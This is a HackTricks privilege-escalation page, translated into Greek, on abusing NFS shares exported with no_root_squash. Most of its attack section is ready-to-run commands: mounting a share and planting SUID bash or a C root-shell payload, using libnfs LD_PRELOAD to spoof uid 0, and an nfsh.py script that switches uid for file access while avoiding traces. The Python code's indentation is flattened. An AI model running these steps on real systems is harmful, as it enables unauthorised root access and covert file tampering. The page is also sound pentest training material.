# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Squashing Basic Info

Το NFS συνήθως (ειδικά σε linux) εμπιστεύεται το `uid` και `gid` που υποδεικνύει ο πελάτης που συνδέεται για να έχει πρόσβαση στα αρχεία (αν δεν χρησιμοποιείται kerberos). Ωστόσο, υπάρχουν κάποιες ρυθμίσεις που μπορούν να οριστούν στον διακομιστή για να **αλλάξουν αυτή τη συμπεριφορά**:

- **`all_squash`**: Συμπιέζει όλες τις προσβάσεις χαρτογραφώντας κάθε χρήστη και ομάδα σε **`nobody`** (65534 unsigned / -2 signed). Επομένως, όλοι είναι `nobody` και δεν χρησιμοποιούνται χρήστες.
- **`root_squash`/`no_all_squash`**: Αυτό είναι προεπιλεγμένο στο Linux και **συμπιέζει μόνο την πρόσβαση με uid 0 (root)**. Επομένως, οποιοδήποτε `UID` και `GID` εμπιστεύονται αλλά το `0` συμπιέζεται σε `nobody` (έτσι δεν είναι δυνατή η προσποίηση root).
- **``no_root_squash`**: Αυτή η ρύθμιση αν ενεργοποιηθεί δεν συμπιέζει ούτε τον χρήστη root. Αυτό σημαίνει ότι αν τοποθετήσετε έναν κατάλογο με αυτή τη ρύθμιση μπορείτε να έχετε πρόσβαση σε αυτόν ως root.

Στο αρχείο **/etc/exports**, αν βρείτε κάποιον κατάλογο που είναι ρυθμισμένος ως **no_root_squash**, τότε μπορείτε να **έχετε πρόσβαση** σε αυτόν **ως πελάτης** και **να γράψετε μέσα** σε αυτόν τον κατάλογο **σαν** να ήσασταν ο τοπικός **root** της μηχανής.

Για περισσότερες πληροφορίες σχετικά με το **NFS** ελέγξτε:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Επιλογή 1 χρησιμοποιώντας bash:
- **Τοποθετώντας αυτόν τον κατάλογο** σε μια μηχανή πελάτη, και **ως root αντιγράφοντας** μέσα στον τοποθετημένο φάκελο το **/bin/bash** δυαδικό και δίνοντάς του **SUID** δικαιώματα, και **εκτελώντας από τη μηχανή του θύματος** αυτό το δυαδικό bash.
- Σημειώστε ότι για να είστε root μέσα στο NFS share, **`no_root_squash`** πρέπει να είναι ρυθμισμένο στον διακομιστή.
- Ωστόσο, αν δεν είναι ενεργοποιημένο, μπορείτε να αναβαθμίσετε σε άλλο χρήστη αντιγράφοντας το δυαδικό στο NFS share και δίνοντάς του την άδεια SUID ως ο χρήστης στον οποίο θέλετε να αναβαθμιστείτε.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 using c compiled code:
- **Μοντάρισμα αυτού του καταλόγου** σε μια μηχανή πελάτη, και **ως root αντιγραφή** μέσα στον μονταρισμένο φάκελο το προετοιμασμένο payload μας που θα εκμεταλλευτεί την άδεια SUID, δίνοντάς του **δικαιώματα SUID**, και **εκτέλεση από τη μηχανή του θύματος** αυτού του δυαδικού (μπορείτε να βρείτε εδώ μερικά [C SUID payloads](payloads-to-execute.md#c)).
- Οι ίδιες περιορισμοί όπως πριν
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Τοπική Εκμετάλλευση

> [!TIP]
> Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **τούνελ από τη μηχανή σας στη μηχανή του θύματος, μπορείτε ακόμα να χρησιμοποιήσετε την απομακρυσμένη έκδοση για να εκμεταλλευτείτε αυτή την κλιμάκωση προνομίων τοποθετώντας τις απαιτούμενες θύρες**.\
> Το παρακάτω κόλπο ισχύει σε περίπτωση που το αρχείο `/etc/exports` **υποδεικνύει μια διεύθυνση IP**. Σε αυτή την περίπτωση **δεν θα μπορείτε να χρησιμοποιήσετε** σε καμία περίπτωση την **απομακρυσμένη εκμετάλλευση** και θα χρειαστεί να **καταχραστείτε αυτό το κόλπο**.\
> Ένα άλλο απαιτούμενο προαπαιτούμενο για να λειτουργήσει η εκμετάλλευση είναι ότι **η εξαγωγή μέσα στο `/etc/export`** **πρέπει να χρησιμοποιεί την ένδειξη `insecure`**.\
> --_Δεν είμαι σίγουρος ότι αν το `/etc/export` υποδεικνύει μια διεύθυνση IP, αυτό το κόλπο θα λειτουργήσει_--

### Βασικές Πληροφορίες

Το σενάριο περιλαμβάνει την εκμετάλλευση ενός προσαρτημένου NFS share σε μια τοπική μηχανή, εκμεταλλευόμενο ένα σφάλμα στην προδιαγραφή NFSv3 που επιτρέπει στον πελάτη να καθορίσει το uid/gid του, ενδεχομένως επιτρέποντας μη εξουσιοδοτημένη πρόσβαση. Η εκμετάλλευση περιλαμβάνει τη χρήση του [libnfs](https://github.com/sahlberg/libnfs), μιας βιβλιοθήκης που επιτρέπει την πλαστογράφηση κλήσεων RPC NFS.

#### Συγκέντρωση της Βιβλιοθήκης

Τα βήματα συγκέντρωσης της βιβλιοθήκης μπορεί να απαιτούν προσαρμογές με βάση την έκδοση του πυρήνα. Σε αυτή την συγκεκριμένη περίπτωση, οι κλήσεις syscalls fallocate είχαν σχολιαστεί. Η διαδικασία συγκέντρωσης περιλαμβάνει τις παρακάτω εντολές:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Διεξαγωγή της Εκμετάλλευσης

Η εκμετάλλευση περιλαμβάνει τη δημιουργία ενός απλού προγράμματος C (`pwn.c`) που ανυψώνει τα δικαιώματα σε root και στη συνέχεια εκτελεί ένα shell. Το πρόγραμμα μεταγλωττίζεται και το παραγόμενο δυαδικό αρχείο (`a.out`) τοποθετείται στο κοινόχρηστο με suid root, χρησιμοποιώντας το `ld_nfs.so` για να προσποιηθεί το uid στις κλήσεις RPC:

1. **Μεταγλωττίστε τον κώδικα εκμετάλλευσης:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Τοποθετήστε την εκμετάλλευση στο κοινόχρηστο και τροποποιήστε τα δικαιώματά της προσποιούμενοι το uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Εκτελέστε την εκμετάλλευση για να αποκτήσετε δικαιώματα root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell για Αθόρυβη Πρόσβαση σε Αρχεία

Μόλις αποκτηθεί η πρόσβαση root, για να αλληλεπιδράσετε με το NFS share χωρίς να αλλάξετε την ιδιοκτησία (για να αποφύγετε την αφήγηση ιχνών), χρησιμοποιείται ένα σενάριο Python (nfsh.py). Αυτό το σενάριο προσαρμόζει το uid ώστε να ταιριάζει με αυτό του αρχείου που προσπελάζεται, επιτρέποντας την αλληλεπίδραση με αρχεία στο share χωρίς προβλήματα άδειας:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Τρέξτε όπως:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
